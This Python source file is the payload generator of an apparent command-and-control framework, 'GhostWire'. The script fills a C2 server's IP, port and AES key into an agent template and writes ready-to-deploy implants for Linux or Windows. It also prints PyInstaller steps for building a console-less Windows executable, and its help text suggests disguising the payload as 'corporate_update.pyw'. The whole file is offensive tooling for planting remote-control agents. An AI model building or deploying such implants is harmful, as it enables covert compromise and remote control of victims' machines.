"""
GhostWire Payload Generator - Agent Payload Creation Tool
========================================================

This script generates customized agent payloads for the GhostWire C2 framework.
It reads the server configuration and agent template to create ready-to-deploy
agents with embedded connection parameters.

Payload Generation Process:
1. Read server state (IP, port, encryption key) from server_state.json
2. Load the agent template with placeholder values
3. Replace placeholders with actual configuration values
4. Generate platform-specific payload files
5. Provide compilation instructions for standalone executables

Supported Platforms:
- Linux/macOS: .py files for direct Python execution
- Windows: .pyw files for console-less execution (can be compiled to .exe)

Security Features:
- Embeds AES-256-GCM encryption key for secure communications
- Uses SSL/TLS for transport layer security
- Generates unique agent IDs based on system characteristics

Usage Examples:
    python3 payload_generator.py --type lin -o linux_agent.py
    python3 payload_generator.py --type win -o windows_agent.pyw

Note: The C2 server must be running at least once to generate the server_state.json
file that contains the necessary configuration parameters.
"""
import os
import sys
import argparse
import json
import platform

# --- ANSI Color Codes for Terminal Output ---
# These provide colored output for better user experience and readability
RESET = '\033[0m'
BOLD = '\033[1m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
CYAN = '\033[36m'

def generate_payload(output_type, output_name):
    """
    Generate a customized agent payload for the specified platform.
    
    This function performs the complete payload generation process:
    1. Validates that required files exist
    2. Reads server configuration from server_state.json
    3. Loads and customizes the agent template
    4. Writes the final payload file
    5. Provides compilation instructions if applicable
    
    Args:
        output_type: Platform type ('lin' for Linux/macOS, 'win' for Windows)
        output_name: Optional custom filename for the output payload
    """
    # --- 1. Define and Validate Paths ---
    # Get the root directory of the GhostWire framework
    root_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Define paths to required files
    state_file = os.path.join(root_dir, 'server_state.json')  # Server configuration
    template_file = os.path.join(root_dir, 'core', 'agent_template.py')  # Agent template
    output_dir = os.path.join(root_dir, 'payloads')  # Output directory for generated payloads

    # Check if server state file exists (indicates C2 server has been run)
    if not os.path.exists(state_file):
        print(f"{RED}{BOLD}[-] FATAL: Server state file 'server_state.json' not found.{RESET}")
        print(f"{YELLOW}    Please run the C2 server (`ghostwire.py`) at least once to generate it.{RESET}")
        return

    # Check if agent template exists
    if not os.path.exists(template_file):
        print(f"{RED}{BOLD}[-] FATAL: Agent template file 'core/agent_template.py' not found.{RESET}")
        return

    # Create the output directory if it doesn't exist
    # This ensures generated payloads have a dedicated location
    os.makedirs(output_dir, exist_ok=True)

    # --- 2. Read Configuration and Template ---
    try:
        # Load server configuration from JSON file
        # This file is created by the C2 server and contains connection parameters
        with open(state_file, 'r') as f:
            state = json.load(f)
        
        # Extract required configuration parameters
        c2_ip = state.get('c2_ip')  # C2 server IP address
        c2_port = state.get('c2_port')  # C2 server port number
        aes_key_b64 = state.get('aes_key_b64')  # Base64-encoded AES encryption key

        # Validate that all required parameters are present
        if not all([c2_ip, c2_port, aes_key_b64]):
            print(f"{RED}{BOLD}[-] FATAL: The 'server_state.json' file is incomplete.{RESET}")
            print(f"{YELLOW}    It must contain 'c2_ip', 'c2_port', and 'aes_key_b64'. Try restarting the server.{RESET}")
            return

        # Load the agent template file
        # This template contains placeholder values that will be replaced
        with open(template_file, 'r') as f:
            template_code = f.read()

    except Exception as e:
        print(f"{RED}[-] Error reading configuration or template file: {e}{RESET}")
        return

    # --- 3. Replace Placeholders in Template ---
    # Replace the placeholder values in the template with actual configuration
    # These placeholders are defined in the agent_template.py file
    agent_code = template_code.replace('##C2_IP##', c2_ip)
    agent_code = agent_code.replace('##C2_PORT##', str(c2_port))
    agent_code = agent_code.replace('##AES_KEY_B64##', aes_key_b64)

    # --- 4. Determine Output Filename and Path ---
    if output_name is None:
        # Generate a default name if one isn't provided by the user
        # Use appropriate file extension based on platform
        ext = '.pyw' if output_type == 'win' else '.py'
        output_name = f'ghostwire_agent_{output_type}{ext}'
    
    # Create the full output path in the payloads directory
    output_path = os.path.join(output_dir, output_name)

    # --- 5. Write the Final Payload File ---
    try:
        # Write the customized agent code to the output file
        with open(output_path, 'w') as f:
            f.write(agent_code)
        
        # Display success message with payload details
        print(f"\n{GREEN}{BOLD}[+] Payload generated successfully!{RESET}")
        print(f"    {CYAN}Type:{RESET}     {output_type}")
        print(f"    {CYAN}Location:{RESET} {output_path}")

        # Provide additional instructions for Windows payloads
        if output_type == 'win':
            print(f"\n{BOLD}{YELLOW}--- Windows Standalone Executable ---{RESET}")
            print("To create a standalone .exe for Windows, use PyInstaller:")
            print(f"  1. Install PyInstaller: {CYAN}pip install pyinstaller{RESET}")
            print(f"  2. Run the compilation command from your terminal:")
            print(f"     {CYAN}pyinstaller --onefile --noconsole --name {os.path.splitext(output_name)[0]} {output_path}{RESET}")
            print(f"  3. The final executable will be in the '{BOLD}dist{RESET}' folder.")
            
    except Exception as e:
        print(f"{RED}[-] Error writing final payload file: {e}{RESET}")

def main():
    """
    Main entry point for the payload generator.
    
    This function:
    1. Sets up command-line argument parsing
    2. Validates user input
    3. Initiates payload generation
    4. Provides helpful usage information
    
    The script supports two main platform types:
    - 'lin': Linux/macOS payloads (.py files)
    - 'win': Windows payloads (.pyw files, can be compiled to .exe)
    """
    # Set up argument parser with detailed help information
    parser = argparse.ArgumentParser(
        description=f"{BOLD}{CYAN}GhostWire C2 Payload Generator{RESET}",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Example: python3 payload_generator.py --type win -o corporate_update.pyw"
    )
    
    # Define the platform type argument
    parser.add_argument(
        '-t', '--type', 
        choices=['lin', 'win'], 
        required=True,
        help="Type of payload to generate:\n"
             "  lin - For Linux/macOS (.py script)\n"
             "  win - For Windows (.pyw script, hides console)"
    )
    
    # Define the optional output filename argument
    parser.add_argument(
        '-o', '--output',
        help="Optional: The name of the output payload file. (e.g., 'agent.py')"
    )
    
    # Display help if no arguments provided
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
        
    # Parse command-line arguments and generate the payload
    args = parser.parse_args()
    generate_payload(args.type, args.output)

# --- Script Entry Point ---
if __name__ == "__main__":
    main()